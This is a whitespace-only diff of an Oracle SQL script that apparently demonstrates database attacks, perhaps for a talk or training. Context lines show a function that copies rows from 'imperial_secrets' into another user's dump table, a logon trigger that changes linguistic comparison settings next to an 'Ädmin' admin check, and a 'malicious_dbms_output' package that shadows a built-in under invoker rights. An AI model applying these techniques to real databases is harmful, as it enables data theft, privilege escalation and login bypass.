@@ -112,9 +112,9 @@ create or replace function bad_func
   as
     pragma autonomous_transaction;
   begin
-		execute immediate 'insert into sabine.secret_dump (secret) select secret from imperial_secrets';
-		commit;
-		return 'Y';
+    execute immediate 'insert into sabine.secret_dump (secret) select secret from imperial_secrets';
+    commit;
+    return 'Y';
   end;
 /
 
@@ -163,7 +163,7 @@ create or replace trigger trg_client_detection
 after logon
 on database
 begin
-	execute immediate 'ALTER SESSION SET NLS_SORT = BINARY_AI NLS_COMP = LINGUISTIC';
+  execute immediate 'ALTER SESSION SET NLS_SORT = BINARY_AI NLS_COMP = LINGUISTIC';
 end;
 /
 #pause
@@ -183,7 +183,7 @@ select is_admin('Ädmin') from dual;
 --------------------------
 connect sabine/sabine@localhost:1522/ORCLPDB1
 create or replace package malicious_dbms_output authid current_user as
-	procedure put_line( i_input varchar2 );
+  procedure put_line( i_input varchar2 );
 end;
 /
 #pause
